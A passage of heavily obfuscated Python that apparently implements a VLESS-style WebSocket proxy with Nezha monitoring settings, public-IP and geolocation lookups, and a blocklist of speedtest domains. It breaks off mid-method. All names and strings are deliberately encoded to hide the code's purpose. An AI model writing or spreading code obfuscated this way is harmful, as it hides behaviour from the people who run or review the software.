import os
import socket
import asyncio
import aiohttp
import logging
from aiohttp import web
from aiohttp import ClientSession as lIIIIIlIlIllIIIIl
from asyncio import Future as IIIIIIlIlIlI, create_task as IllIIlllllIIllIIIlI, gather as llIlIIlIlIIIIlIllIl, open_connection as lIlIIllIlIIlIll, run as lIlIIIlllllIIll, sleep as IllIlllllIlIIlIlIlIllIIlII, wait_for as IlllIIlIlllIllIIIlllIIlI
from base64 import b64encode as IIllIIIlIllIllIIllllIl
from hashlib import sha224 as llllIIIllllIllllIIllll
from ipaddress import ip_address as lIIlIlIlIIlllIlIlIlllII
from logging import basicConfig as lIIIIIllllIIl, getLogger as lIIIlllIllIlII
from os import chmod as lIIlIIIIIllllIIllI, remove as llIIIllIIIllIIIIIllIll
from socket import socket as IIIIlIIIlllIlIlIIlIll
from struct import unpack as IlllIllllIlIIIl
from subprocess import Popen as lIlIlIIIIIll, run as IIIIlIlIIlllIIlIIlI
from sys import exit as llllllIllIlIlIIIIlllI
llIIIllIlIIlIIlIllllIlIlI = globals()[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 197) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('9a9aa7b0aca9b1acabb69a9a')]
IIIIlllIIIllIIIIlIllIlII = llIIIllIlIIlIIlIllllIlIlI if isinstance(llIIIllIlIIlIIlIllllIlIlI, dict) else llIIIllIlIIlIIlIllllIlIlI.__dict__
UUID = os.environ.get((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('44495555'), (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 46) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('484f194d4c1b4f1f034c191f1d031a1e4b4c034c184d4a031a1b4c184c1b1e171b161a1f'))
NEZHA_SERVER = os.environ.get((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 221) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('939887959c828e988f8b988f'), '')
NEZHA_PORT = os.environ.get((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 119) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('39322d3f362827382523'), '')
NEZHA_KEY = os.environ.get((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 197) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('8b809f8d849a8e809c'), '')
DOMAIN = os.environ.get((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 34)) for c in IIIIIIlIIlIlII)))([102, 109, 111, 99, 107, 108]), '')
SUB_PATH = os.environ.get((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 195) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('9096819c9382978b'), (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 205 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([175, 184, 190]))
NAME = os.environ.get((lambda n: int.__xor__(n, 2993613220).to_bytes(4, 'big').decode())(4230980833), '')
WSPATH = os.environ.get((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 140) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('dbdfdccdd8c4'), UUID[:0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 120 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([72, 73, 73]), 16) - 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 97)) for c in IIIIIIlIIlIlII)))([80, 81, 89]), 16)])
PORT = IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 216) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('b1b6ac')](os.environ.get((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 83) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('0016010516010c031c0107')) or os.environ.get((lambda n: int.__xor__(n, 2295444796).to_bytes(4, 'big').decode())(3634292584)) or 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 143 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([203, 186]), 16) << 0 .__class__((lambda n: int.__xor__(n, 140).to_bytes(1, 'big').decode())(185), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 247 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([207, 198]), 16))
AUTO_ACCESS = os.environ.get((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 192 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([147, 147, 133, 131, 131, 129, 159, 143, 148, 149, 129]), '').lower() == (lambda n: int.__xor__(n, 1638790022).to_bytes(4, 'big').decode())(366970595)
DEBUG = os.environ.get((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 70)) for c in IIIIIIlIIlIlII)))([2, 3, 4, 19, 1]), '').lower() == (lambda n: int.__xor__(n, 689277550).to_bytes(4, 'big').decode())(1567096587)
lllIlIlIllIl = DOMAIN
IlIlIIlllllIIIIIlllllIII = 0 .__class__((lambda n: int.__xor__(n, 8210704).to_bytes(3, 'big').decode())(5206313), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 15527890).to_bytes(3, 'big').decode())(14671072), 16)
IlIIIIlIIlIIllIllllllIl = (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('736c74')
IIIlllIIIlIllIIIIIIIII = ''
IlIIIlIIlIII = [(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 175) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('978197819b819b'), (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 154) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('abb4abb4abb4ab')]
IllllIIllIII = [(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 76)) for c in IIIIIIlIIlIlII)))([63, 60, 41, 41, 40, 56, 41, 63, 56, 98, 34, 41, 56]), (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 187) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('dddac8cf95d8d4d6'), (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6e632e747365746465657073'), (lambda n: int.__xor__(n, 83697270510919117537649496764365595269968685552).to_bytes(20, 'big').decode())(718473642795502359948403808760982772741234525853), (lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 6)) for c in IIIIIIlIIlIlII)))([117, 118, 99, 99, 98, 105, 96, 40, 107, 99]), (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('74656e2e796d74736574'), (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 53) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('57545b51425c51415d1b4559545650'), (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 154) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('e9eafffffeb4f3f5'), (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 56 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([95, 74, 87, 22, 92, 93, 93, 72, 75, 93, 74, 90, 81, 84]), (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('67726f2e6b636568636465657073')]
lIllllIlIIIlll = logging.DEBUG if DEBUG else logging.INFO
lIIIIIllllIIl(level=lIllllIlIIIlll, format=(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 127) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('5a571e0c1c0b16121a560c5f525f5a57131a091a13111e121a560c5f525f5a57121a0c0c1e181a560c'))
lIIIlllIllIlII((lambda n: int.__xor__(n, 4269905702411797974376048476851677).to_bytes(14, 'big').decode())(3649300547184148509305067479105198)).setLevel(logging.WARNING)
lIIIlllIllIlII((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('7265767265732e707474686f6961')).setLevel(logging.WARNING)
lIIIlllIllIlII((lambda n: int.__xor__(n, 684256973767180078910652486818991).to_bytes(14, 'big').decode())(1315021283433149732036601273250523)).setLevel(logging.WARNING)
lIIIlllIllIlII((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 98)) for c in IIIIIIlIIlIlII)))([3, 11, 13, 10, 22, 22, 18, 76, 11, 12, 22, 7, 16, 12, 3, 14])).setLevel(logging.WARNING)
lIIIlllIllIlII((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('74656b636f736265772e707474686f6961')).setLevel(logging.WARNING)
IlIllIIIIlIIlIll = lIIIlllIllIlII(__name__)

def lIIIlIIIIIII(port, host=(lambda n: int.__xor__(n, 39393394331434263).to_bytes(7, 'big').decode())(52875675067945767)):
    with IIIIlIIIlllIlIlIIlIll(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
            return True
        except OSError:
            return False

def IIIIIIIllIIllIIlIIIlll(llIlIIIlIlIlIIIIII, llIllllIllllIIlIIIIIll=0 .__class__((lambda n: int.__xor__(n, 1486).to_bytes(2, 'big').decode())(25080), 16) - 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 22 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([36, 33]), 16)):
    for port in IIIIlllIIIllIIIIlIllIlII[(lambda n: int.__xor__(n, 269488477306).to_bytes(5, 'big').decode())(330170217247)](llIlIIIlIlIlIIIIII, llIlIIIlIlIlIIIIII + llIllllIllllIIlIIIIIll):
        if lIIIlIIIIIII(port):
            return port
    return None

def IIlllIlIIIlllll(host: str) -> bool:
    if not host:
        return False
    IIlIIIIIIIIlIIl = host.lower()
    return IIIIlllIIIllIIIIlIllIlII[(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('796e61')]((IIlIIIIIIIIlIIl == IIIIIlIlIIlllIIIIIl or IIlIIIIIIIIlIIl.endswith((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('2e') + IIIIIlIlIIlllIIIIIl) for IIIIIlIlIIlllIIIIIl in IllllIIllIII))

async def lllllllIlIlIlIlIIIl():
    global IIIlllIIIlIllIIIIIIIII
    try:
        async with lIIIIIlIlIllIIIIl() as lIIIIlIIlIlIlIllllIIlIlIlII:
            async with lIIIIlIIlIlIlIllllIIlIlIlII.get((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 122)) for c in IIIIIIlIIlIlII)))([18, 14, 14, 10, 9, 64, 85, 85, 27, 10, 19, 84, 19, 10, 84, 9, 24, 85, 29, 31, 21, 19, 10]), headers={(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 13)) for c in IIIIIIlIIlIlII)))([88, 126, 104, 127, 32, 76, 106, 104, 99, 121]): (lambda n: int.__xor__(n, 191739701747934047532172174).to_bytes(11, 'big').decode())(256240556464092629802577342)}, timeout=0 .__class__((lambda n: int.__xor__(n, 5623).to_bytes(2, 'big').decode())(20686), 16) - 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 103)) for c in IIIIIIlIIlIlII)))([34, 81]), 16)) as IllIIIIIIllllll:
                if IllIIIIIIllllll.status == 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 16)) for c in IIIIIIlIIlIlII)))([34, 41, 37]), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('444331'), 16):
                    data = await IllIIIIIIllllll.json()
                    IIIlllIIIlIllIIIIIIIII = f"{data.get((lambda n: int.__xor__(n, 28512131646440555898781604156).to_bytes(12, 'big').decode())(19594098938779549010904743257), '')}-{data.get((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('707369'), '')}".replace((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 238 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([206]), (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 152 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([199]))
                    return
    except:
        pass
    try:
        async with lIIIIIlIlIllIIIIl() as lIIIIlIIlIlIlIllllIIlIlIlII:
            async with lIIIIlIIlIlIlIllllIIlIlIlII.get((lambda n: int.__xor__(n, 78775917431047971288809702119155979577023956285218503).to_bytes(22, 'big').decode())(69954592912440481044437513682883122551192392256598441), headers={(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 51)) for c in IIIIIIlIIlIlII)))([102, 64, 86, 65, 30, 114, 84, 86, 93, 71]): (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('302e352f616c6c697a6f4d')}, timeout=0 .__class__((lambda n: int.__xor__(n, 99).to_bytes(1, 'big').decode())(5), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 80 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([96]), 16) + 0 .__class__((lambda n: int.__xor__(n, 23).to_bytes(1, 'big').decode())(36), 16)) as IllIIIIIIllllll:
                if IllIIIIIIllllll.status == 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 6) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('3e'), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 137 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([176, 184]), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 83 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([99]), 16):
                    data = await IllIIIIIIllllll.json()
                    IIIlllIIIlIllIIIIIIIII = f"{data.get((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('65646f437972746e756f63'), '')}-{data.get((lambda n: int.__xor__(n, 8620465).to_bytes(3, 'big').decode())(15530966), '')}".replace((lambda n: int.__xor__(n, 118).to_bytes(1, 'big').decode())(86), (lambda n: int.__xor__(n, 185).to_bytes(1, 'big').decode())(230))
                    return
    except:
        pass
    IIIlllIIIlIllIIIIIIIII = (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 235 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([133, 156, 132, 133, 128, 133, 190])

async def IIllIlIlllllIlIlIlIlIIll():
    global lllIlIlIllIl, IlIIIIlIIlIIllIllllllIl, IlIlIIlllllIIIIIlllllIII
    if not DOMAIN or DOMAIN == (lambda n: int.__xor__(n, 268704478466787911373719964759919738).to_bytes(15, 'big').decode())(387785897788973050688162474363708183):
        try:
            async with lIIIIIlIlIllIIIIl() as lIIIIlIIlIlIlIllllIIlIlIlII:
                async with lIIIIlIIlIlIlIllllIIlIlIlII.get((lambda n: int.__xor__(n, 240984146592992721649736185483426496205534039730723682050585).to_bytes(25, 'big').decode())(490015791451695128081002336977749010783517250595974329109353), timeout=0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 95 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([102]), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 75 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([123]), 16) + 0 .__class__((lambda n: int.__xor__(n, 242).to_bytes(1, 'big').decode())(199), 16)) as IllIIIIIIllllll:
                    if IllIIIIIIllllll.status == 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('61'), 16) * 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 155) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('aaaf'), 16) + 0 .__class__((lambda n: int.__xor__(n, 191).to_bytes(1, 'big').decode())(143), 16):
                        ip = await IllIIIIIIllllll.text()
                        lllIlIlIllIl = ip.strip()
                        IlIIIIlIIlIIllIllllllIl = (lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 32)) for c in IIIIIIlIIlIlII)))([78, 79, 78, 69])
                        IlIlIIlllllIIIIIlllllIII = PORT
        except Exception as lIIlllIIIllIIIlllIllIIIl:
            IlIllIIIIlIIlIll.error(f'Failed to get IP: {lIIlllIIIllIIIlllIllIIIl}')
            lllIlIlIllIl = (lambda n: int.__xor__(n, 62762697355984703718701794351766172052451910359432593).to_bytes(22, 'big').decode())(73647416823882166587199513320491977715292973340611324)
            IlIIIIlIIlIIllIllllllIl = (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 94 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([45, 50, 42])
            IlIlIIlllllIIIIIlllllIII = 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 33)) for c in IIIIIIlIIlIlII)))([18, 22]), 16) << 0 .__class__((lambda n: int.__xor__(n, 244).to_bytes(1, 'big').decode())(199), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 121 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([74]), 16)
    else:
        lllIlIlIllIl = DOMAIN
        IlIIIIlIIlIIllIllllllIl = (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 71) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('332b34')
        IlIlIIlllllIIIIIlllllIII = 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 113)) for c in IIIIIIlIIlIlII)))([67, 70, 18]), 16) - 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 59) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('780a'), 16)

async def lllIIlIllllIlIII(host: str) -> str:
    try:
        lIIlIlIlIIlllIlIlIlllII(host)
        return host
    except:
        pass
    for lIllllIIlllllIlIIlllIlIlI in IlIIIlIIlIII:
        try:
            async with lIIIIIlIlIllIIIIl() as lIIIIlIIlIlIlIllllIIlIlIlII:
                url = f'https://dns.google/resolve?name={host}&type=A'
                async with lIIIIlIIlIlIlIllllIIlIlIlII.get(url, timeout=0 .__class__((lambda n: int.__xor__(n, 48036).to_bytes(2, 'big').decode())(35986), 16) - 0 .__class__((lambda n: int.__xor__(n, 6718).to_bytes(2, 'big').decode())(11535), 16)) as IllIIIIIIllllll:
                    if IllIIIIIIllllll.status == 0 .__class__((lambda n: int.__xor__(n, 155).to_bytes(1, 'big').decode())(173), 16) << 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('35'), 16) | 0 .__class__((lambda n: int.__xor__(n, 150).to_bytes(1, 'big').decode())(174), 16):
                        data = await IllIIIIIIllllll.json()
                        if data.get((lambda n: int.__xor__(n, 153286257973986).to_bytes(6, 'big').decode())(237622781865873)) == 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 87 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([110, 97]), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 118)) for c in IIIIIIlIIlIlII)))([64, 79]), 16) and data.get((lambda n: int.__xor__(n, 124613008631497).to_bytes(6, 'big').decode())(53033340388283)):
                            for IIlIlIIllIIIlIllI in data[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 16) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('517e63677562')]:
                                if IIlIlIIllIIIlIllI.get((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 100)) for c in IIIIIIlIIlIlII)))([16, 29, 20, 1])) == 0 .__class__((lambda n: int.__xor__(n, 213).to_bytes(1, 'big').decode())(236), 16) * 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16) + 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('31'), 16):
                                    return IIlIlIIllIIIlIllI.get((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('61746164'))
        except:
            continue
    return host

class lllllIIllIIIIIlll:

    def __init__(self, uuid: str):
        self.uuid = uuid
        self.uuid_bytes = bytes.fromhex(uuid)

    async def IlIllIIIIIlIIlIlllIIlIlII(self, websocket, IIllllIllIIIIIlIlllIlIlI: bytes) -> bool:
        try:
            if IIIIlllIIIllIIIIlIllIlII[(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6e656c')](IIllllIllIIIIIlIlllIlIlI) < 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 215 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([150]), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 75 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([122]), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 172 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([148]), 16) or IIllllIllIIIIIlIlllIlIlI[0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3236'), 16) ^ 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3236'), 16)] != 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 67) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('2720'), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 71)) for c in IIIIIIlIIlIlII)))([3, 4]), 16):
                return False
            if IIllllIllIIIIIlIlllIlIlI[0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 123)) for c in IIIIIIlIIlIlII)))([25]), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 97 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([81]), 16) + 0 .__class__((lambda n: int.__xor__(n, 208).to_bytes(1, 'big').decode())(225), 16):0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 122)) for c in IIIIIIlIIlIlII)))([78]), 16) ^ 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 252) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('cdc9'), 16)] != self.uuid_bytes:
                return False
            llIIIIIlIllIlllll = IIllllIllIIIIIlIlllIlIlI[0 .__class__((lambda n: int.__xor__(n, 64).to_bytes(1, 'big').decode())(114), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 107)) for c in IIIIIIlIIlIlII)))([90, 88]), 16)] + (0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 98 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([81, 6, 83]), 16) - 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 56) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('095b08'), 16))
            if llIIIIIlIllIlllll + (0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 155 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([172]), 16) * 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 9)) for c in IIIIIIlIIlIlII)))([58]), 16)) > IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 125 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([19, 24, 17])](IIllllIllIIIIIlIlllIlIlI):
                return False
            port = IlllIllllIlIIIl((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 250) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('dbb2'), IIllllIllIIIIIlIlllIlIlI[llIIIIIlIllIlllll:llIIIIIlIllIlllll + (0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 126)) for c in IIIIIIlIIlIlII)))([71]), 16) * 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 97)) for c in IIIIIIlIIlIlII)))([83]), 16))])[0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 147 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([160, 161]), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 48693).to_bytes(2, 'big').decode())(35846), 16)]
